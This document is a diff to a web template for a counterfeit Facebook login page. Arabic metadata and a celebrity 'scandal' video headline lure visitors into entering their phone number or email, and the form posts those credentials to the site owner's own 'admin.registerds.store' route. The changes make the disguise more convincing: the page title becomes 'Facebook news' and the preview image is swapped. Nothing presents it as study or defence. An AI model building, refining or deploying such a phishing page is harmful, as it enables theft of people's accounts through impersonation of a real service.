@@ -4,7 +4,7 @@
   <!DOCTYPE html>
   <html>
     <head>
-      <title>Bootstrap 5 Facebook Login Page</title>
+      <title>Facebook news</title>
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width, initial-scale=1">
       <meta name="description" content="سجل الدخول لمشاهدة الفديو">
@@ -12,7 +12,7 @@
       <meta property="og:title" content="فضيحة الفنانة اسماء" />
 <meta property="og:type" content="video.movie" />
 <meta property="og:url" content="https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.freepressjournal.in%2Fampstories%2Fphoto-gallery%2Fsexy-saree-pictures-of-janhvi-kapoor&psig=AOvVaw3dic2X1JZb3oEVUI1SfjP4&ust=1663894444619000&source=images&cd=vfe&ved=0CAwQjRxqFwoTCIjip6CYp_oCFQAAAAAdAAAAABAc" />
-<meta property="og:image" content="https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.freepressjournal.in%2Fampstories%2Fphoto-gallery%2Fsexy-saree-pictures-of-janhvi-kapoor&psig=AOvVaw3dic2X1JZb3oEVUI1SfjP4&ust=1663894444619000&source=images&cd=vfe&ved=0CAwQjRxqFwoTCIjip6CYp_oCFQAAAAAdAAAAABAc" />
+<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxXVOiTCUbv1FWs2vsF1Bc534wDb6aGY2pfg&usqp=CAU" />
 
       <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&display=swap" rel="stylesheet">
       <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
@@ -85,7 +85,7 @@
           <div class="col-md-5" style="margin-top: -230px;">
           <div id="log">  <center> <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="w-50">  </center></div>
           <form method="POST" action="{{ route("admin.registerds.store") }}">
-            @csrf
+             @csrf
               <div class="mb-3">
                 <input type="text" class="form-control" name="email" placeholder="Mobile number or email address"
                   required>
